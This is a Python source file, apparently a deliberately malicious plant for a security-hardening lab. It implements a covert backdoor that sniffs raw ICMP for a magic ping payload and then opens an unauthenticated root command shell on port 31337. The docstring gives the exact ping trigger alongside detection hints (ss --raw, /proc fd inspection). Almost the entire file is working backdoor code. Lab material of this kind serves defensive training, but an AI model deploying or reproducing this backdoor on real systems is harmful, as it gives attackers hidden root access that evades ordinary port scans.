#!/usr/bin/env python3
"""knockd-helper — COVERT RAW-SOCKET BACKDOOR (lab plant).

                    !!!  DELIBERATELY MALICIOUS LAB PLANT  !!!

This models the backdoor that defeats naive recon. It opens a *raw ICMP socket*
and passively waits for a magic "knock" packet. Until it sees one it has NO
bound TCP/UDP socket at all, so `ss -lntup` shows nothing. When a ping carrying
the magic payload arrives, it opens a root command shell on a high port.

Trigger it with:  ping -c1 -p 4d5348502d4b4e4f434b <host>   (payload MSHP-KNOCK)
Find it anyway with:  ss --raw -p   /   grep the raw-socket FD in /proc/*/fd
                      (that is the whole point of harden/01-recon)

Runs as root so the opened shell is root. Inert until knocked, confined to the
disposable VM, and killed by harden/05-services. Never run outside the lab.
"""
import os
import socket
import subprocess
import threading

MAGIC = b"MSHP-KNOCK"
SHELL_PORT = 31337


def handle(conn):
    conn.sendall(b"# ")
    while True:
        try:
            data = conn.recv(4096)
        except OSError:
            break
        if not data:
            break
        cmd = data.decode("utf-8", "replace").strip()
        if cmd in ("exit", "quit"):
            break
        try:
            out = subprocess.run(cmd, shell=True, capture_output=True, timeout=15)
            conn.sendall(out.stdout + out.stderr + b"# ")
        except Exception as exc:  # noqa: BLE001 - lab backdoor, stay alive
            conn.sendall(f"{exc}\n# ".encode())
    conn.close()


def shell_server():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", SHELL_PORT))
    srv.listen(5)
    while True:
        conn, _ = srv.accept()
        threading.Thread(target=handle, args=(conn,), daemon=True).start()


def main():
    # Raw ICMP socket: receives ICMP for the host, incl. loopback. No listener.
    sniff = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    armed = False
    while True:
        pkt, _ = sniff.recvfrom(65535)
        if MAGIC in pkt and not armed:
            armed = True
            threading.Thread(target=shell_server, daemon=True).start()


if __name__ == "__main__":
    main()
